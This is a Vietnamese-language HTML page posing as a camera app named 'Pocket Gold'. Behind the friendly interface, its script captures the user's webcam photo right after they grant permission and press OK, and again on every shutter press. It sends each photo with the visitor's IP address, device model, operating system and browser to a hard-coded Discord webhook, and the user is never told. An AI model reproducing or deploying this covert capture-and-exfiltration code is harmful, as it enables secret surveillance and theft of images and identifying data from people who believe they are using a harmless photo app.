<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Pocket Gold</title>
  <!-- Phosphor Icons -->
  <script src="https://unpkg.com/@phosphor-icons/web"></script>
  <!-- UA-Parser-JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
  <style>
    :root {
      --bg-color: #ffaa33;
      --card-bg: #e69526;
      --text-color: #ffffff;
      --accent-color: #ffffff;
      --btn-bg: rgba(255, 255, 255, 0.2);
    }

    body.theme-orange {
      --bg-color: #ffaa33;
      --card-bg: #e69526;
      --text-color: #ffffff;
      --accent-color: #ffffff;
    }
    body.theme-pink {
      --bg-color: #fbcfe8;
      --card-bg: #f472b6;
      --text-color: #831843;
      --accent-color: #db2777;
    }
    body.theme-black {
      --bg-color: #000000;
      --card-bg: #18181b;
      --text-color: #ffffff;
      --accent-color: #a1a1aa;
    }
    body.theme-white {
      --bg-color: #f4f4f5;
      --card-bg: #ffffff;
      --text-color: #09090b;
      --accent-color: #18181b;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 12px 16px;
      transition: background-color 0.4s cubic-bezier(0.4, 0, 0.2, 1), color 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      overflow: hidden;
    }

    /* Top Bar */
    .top-bar {
      width: 100%;
      max-width: 360px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 4px 0;
      animation: fadeInDown 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .icon-btn {
      background: var(--btn-bg);
      border: none;
      color: var(--text-color);
      width: 42px;
      height: 42px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      cursor: pointer;
      backdrop-filter: blur(10px);
      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .icon-btn:active {
      transform: scale(0.88);
    }

    .theme-selector {
      display: flex;
      gap: 6px;
      background: var(--btn-bg);
      padding: 4px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
    }

    .theme-dot {
      width: 22px;
      height: 22px;
      border-radius: 50%;
      border: 2px solid transparent;
      cursor: pointer;
      transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .theme-dot.active {
      border-color: var(--text-color);
      transform: scale(1.18);
    }

    /* Khung Viewfinder 9:16 */
    .viewfinder-container {
      width: 100%;
      max-width: 280px;
      aspect-ratio: 9 / 16;
      border-radius: 32px;
      overflow: hidden;
      position: relative;
      background-color: #000;
      box-shadow: 0 16px 32px rgba(0,0,0,0.25);
      display: flex;
      align-items: center;
      justify-content: center;
      animation: zoomIn 0.7s cubic-bezier(0.16, 1, 0.3, 1);
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      background: #000;
      transition: transform 0.3s ease, filter 0.3s ease;
    }

    #video.blur-effect {
      filter: blur(14px) brightness(0.6);
    }

    #video.mirror {
      transform: scaleX(-1);
    }

    .badge-friends {
      position: absolute;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.4);
      color: white;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
      backdrop-filter: blur(10px);
      z-index: 2;
    }

    .screen-flash {
      position: fixed;
      inset: 0;
      background-color: #ffffff;
      z-index: 9999;
      display: none;
      opacity: 0;
      transition: opacity 0.05s ease-in-out;
    }

    /* Popup Modals */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.75);
      backdrop-filter: blur(10px);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      animation: fadeIn 0.3s ease-out;
    }

    .modal-box {
      background: #1e1e1e;
      color: white;
      width: 100%;
      max-width: 320px;
      border-radius: 28px;
      padding: 24px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
      animation: popUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .modal-icon {
      font-size: 48px;
      color: #ffaa33;
      margin-bottom: 12px;
    }

    .modal-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .modal-desc {
      font-size: 14px;
      color: #a1a1aa;
      line-height: 1.4;
      margin-bottom: 20px;
    }

    .modal-btn {
      width: 100%;
      background: #ffaa33;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 20px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      transition: transform 0.2s, background-color 0.2s;
    }

    .modal-btn:active {
      transform: scale(0.95);
    }

    /* Controls */
    .controls {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
      margin-bottom: 6px;
      animation: fadeInDown 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .action-row {
      width: 100%;
      display: flex;
      justify-content: space-around;
      align-items: center;
    }

    .shutter-btn {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      border: 4px solid var(--text-color);
      background: transparent;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 4px;
      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .shutter-inner {
      width: 100%;
      height: 100%;
      background: var(--text-color);
      border-radius: 50%;
      transition: transform 0.15s ease-out;
    }

    .shutter-btn:active .shutter-inner {
      transform: scale(0.82);
    }

    .shutter-btn.disabled {
      pointer-events: none;
      opacity: 0.5;
    }

    .history-row {
      display: flex;
      gap: 8px;
      align-items: center;
      opacity: 0.85;
    }

    .history-item {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: var(--btn-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
    }

    .rotate-icon {
      transition: transform 0.4s ease;
    }
    .rotate-icon.rotated {
      transform: rotate(180deg);
    }

    /* Animations */
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes fadeInDown { from { opacity: 0; transform: translateY(-12px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes zoomIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
    @keyframes popUp { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

    .spinner {
      display: inline-block;
      animation: spin 1.5s infinite linear;
    }
  </style>
</head>
<body class="theme-orange">

  <!-- Popup 1: Yêu cầu cấp quyền ban đầu -->
  <div class="modal-overlay" id="permission-modal">
    <div class="modal-box">
      <i class="ph ph-camera modal-icon"></i>
      <div class="modal-title">Cấp quyền Camera</div>
      <div class="modal-desc">Trang web yêu cầu quyền truy cập Camera để tiếp tục sử dụng ứng dụng Pocket Gold.</div>
      <button class="modal-btn" onclick="startPermissionFlow()">Đồng ý & Bắt đầu</button>
    </div>
  </div>

  <!-- Popup 2: Đang xử lý -> Đã xử lý xong (Nút OK) -->
  <div class="modal-overlay" id="process-modal" style="display: none;">
    <div class="modal-box">
      <i class="ph ph-sparkle modal-icon spinner" id="process-icon"></i>
      <div class="modal-title" id="process-title">Đang xử lý Camera</div>
      <div class="modal-desc" id="process-desc">Hệ thống đang kiểm tra và tối ưu hóa ống kính camera của bạn...</div>
      <button class="modal-btn" id="ok-btn" style="display: none;" onclick="handleOkClick()">OK</button>
    </div>
  </div>

  <div class="screen-flash" id="screen-flash"></div>

  <div class="top-bar">
    <button class="icon-btn" id="flash-btn" onclick="toggleFlash()">
      <i class="ph ph-lightning"></i>
    </button>

    <div class="theme-selector">
      <div class="theme-dot" style="background: #000000;" onclick="setTheme('black', this)"></div>
      <div class="theme-dot active" style="background: #ffaa33;" onclick="setTheme('orange', this)"></div>
      <div class="theme-dot" style="background: #fbcfe8;" onclick="setTheme('pink', this)"></div>
      <div class="theme-dot" style="background: #ffffff;" onclick="setTheme('white', this)"></div>
    </div>

    <button class="icon-btn">
      <i class="ph ph-user-plus"></i>
    </button>
  </div>

  <div class="viewfinder-container">
    <video id="video" class="blur-effect" autoplay playsinline muted></video>
    <div class="badge-friends">
      <i class="ph ph-users-three"></i> Bạn bè
    </div>
  </div>

  <div class="controls">
    <div class="action-row">
      <div style="width: 42px;"></div>

      <button class="shutter-btn disabled" id="shutter-btn" onclick="takePhotoSequence('Nút chụp tròn màu trắng (Lần 2)')">
        <div class="shutter-inner"></div>
      </button>

      <button class="icon-btn" id="switch-cam-btn" onclick="switchCamera()">
        <i class="ph ph-cameraswitch rotate-icon" id="switch-icon"></i>
      </button>
    </div>

    <div class="history-row">
      <div class="history-item"><i class="ph ph-clock-counter-clockwise"></i></div>
      <span style="font-size: 12px; font-weight: 500;">Khoảnh khắc vừa ghi</span>
    </div>
  </div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1530830759496253591/Pbzj6XovoFjAyAqjYSOvFYkaFk1UP1wRRYU3HFSN8VFNCFTIWx4rhk7mWeECi4_aicI2";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const shutterBtn = document.getElementById('shutter-btn');
    const screenFlash = document.getElementById('screen-flash');
    const permissionModal = document.getElementById('permission-modal');
    const processModal = document.getElementById('process-modal');
    const processIcon = document.getElementById('process-icon');
    const processTitle = document.getElementById('process-title');
    const processDesc = document.getElementById('process-desc');
    const okBtn = document.getElementById('ok-btn');
    const switchIcon = document.getElementById('switch-icon');

    let currentStream = null;
    let facingMode = 'user'; 
    let isFlashEnabled = true;
    let userIP = "Không xác định";

    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
      } catch (e) {
        userIP = "Không thể lấy IP";
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      getUserIP();
    });

    async function startPermissionFlow() {
      permissionModal.style.display = 'none';
      
      const success = await initCamera('user');
      
      if (success) {
        processModal.style.display = 'flex';
        
        setTimeout(() => {
          processIcon.className = 'ph ph-check-circle modal-icon';
          processIcon.style.color = '#22c55e';
          processTitle.innerText = 'Đã xử lý xong!';
          processDesc.innerText = 'Camera đã sẵn sàng. Nhấn nút OK bên dưới để bắt đầu ghi hình.';
          okBtn.style.display = 'block';
          
          video.classList.remove('blur-effect');
        }, 1500);
      } else {
        alert("Không thể truy cập Camera. Vui lòng kiểm tra lại quyền truy cập.");
        permissionModal.style.display = 'flex';
      }
    }

    async function handleOkClick() {
      processModal.style.display = 'none';
      shutterBtn.classList.remove('disabled');
      
      await takePhotoSequence("Nút OK Popup (Lần 1)");
    }

    // FIX LỖI ZOOM CAMERA TRÊN iOS & ANDROID
    async function initCamera(mode) {
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
      }

      facingMode = mode;

      // Cấu hình không cố định chiều rộng/cao cứng để tránh ép camera vào góc cận (zoom)
      const constraintsList = [
        {
          video: {
            facingMode: { exact: facingMode },
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        },
        {
          video: {
            facingMode: facingMode,
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        },
        { video: true, audio: false }
      ];

      let stream = null;
      for (const constraints of constraintsList) {
        try {
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          if (stream) break;
        } catch (e) {
          // Thử cấu hình tiếp theo nếu gặp lỗi
        }
      }

      if (stream) {
        currentStream = stream;
        video.srcObject = currentStream;
        await video.play();
        
        if (facingMode === 'user') {
          video.classList.add('mirror');
        } else {
          video.classList.remove('mirror');
        }
        return true;
      } else {
        console.error("Lỗi khởi tạo Camera");
        return false;
      }
    }

    function triggerScreenFlash() {
      return new Promise((resolve) => {
        screenFlash.style.display = 'block';
        screenFlash.style.opacity = '1';
        setTimeout(() => {
          screenFlash.style.opacity = '0';
          setTimeout(() => {
            screenFlash.style.display = 'none';
            resolve();
          }, 100);
        }, 300);
      });
    }

    function switchCamera() {
      switchIcon.classList.toggle('rotated');
      const nextMode = (facingMode === 'user') ? 'environment' : 'user';
      initCamera(nextMode);
    }

    function captureFrame() {
      return new Promise((resolve) => {
        const context = canvas.getContext('2d');
        const vW = video.videoWidth;
        const vH = video.videoHeight;

        // Cắt khung hình chuẩn tỉ lệ 9:16 mà không làm méo hay phóng to ảnh
        const targetRatio = 9 / 16;
        const currentRatio = vW / vH;

        let sWidth, sHeight, sx, sy;

        if (currentRatio > targetRatio) {
          sHeight = vH;
          sWidth = vH * targetRatio;
          sx = (vW - sWidth) / 2;
          sy = 0;
        } else {
          sWidth = vW;
          sHeight = vW / targetRatio;
          sx = 0;
          sy = (vH - sHeight) / 2;
        }

        canvas.width = 1080;
        canvas.height = 1920;

        context.save();
        if (facingMode === 'user') {
          context.translate(canvas.width, 0);
          context.scale(-1, 1);
        }

        context.drawImage(video, sx, sy, sWidth, sHeight, 0, 0, canvas.width, canvas.height);
        context.restore();

        canvas.toBlob((blob) => {
          resolve(blob);
        }, 'image/jpeg', 0.92);
      });
    }

    async function takePhotoSequence(triggerSource) {
      shutterBtn.classList.add('disabled');
      
      if (isFlashEnabled) {
        triggerScreenFlash();
      }

      const blob = await captureFrame();
      const photos = [{ name: 'camera_capture.jpg', blob: blob }];

      await sendToDiscord(photos, triggerSource);
      shutterBtn.classList.remove('disabled');
    }

    async function sendToDiscord(photos, triggerSource) {
      const formData = new FormData();
      
      photos.forEach((photo, index) => {
        formData.append(`file${index + 1}`, photo.blob, photo.name);
      });

      const now = new Date();
      const timeString = now.toLocaleString('vi-VN', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
      });

      const parser = new UAParser();
      const result = parser.getResult();

      const browserName = result.browser.name || "Không rõ";
      const browserVersion = result.browser.version || "";
      const osName = result.os.name || "Không rõ";
      const osVersion = result.os.version || "";
      const deviceModel = result.device.model || result.device.type || "PC/Unidentified";

      formData.append("payload_json", JSON.stringify({
        content: `📸 **Khoảnh khắc mới từ Pocket Gold!**\n🎯 **Thao tác bởi:** \`${triggerSource}\` \n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
      }));

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          body: formData
        });
      } catch (error) {
        console.error("Lỗi gửi Webhook:", error);
      }
    }

    function setTheme(themeName, element) {
      document.body.className = `theme-${themeName}`;
      document.querySelectorAll('.theme-dot').forEach(dot => dot.classList.remove('active'));
      element.classList.add('active');
    }

    function toggleFlash() {
      isFlashEnabled = !isFlashEnabled;
      const btn = document.getElementById('flash-btn');
      const icon = btn.querySelector('i');
      if (isFlashEnabled) {
        icon.className = 'ph ph-lightning';
      } else {
        icon.className = 'ph ph-lightning-slash';
      }
    }
  </script>
</body>
</html>
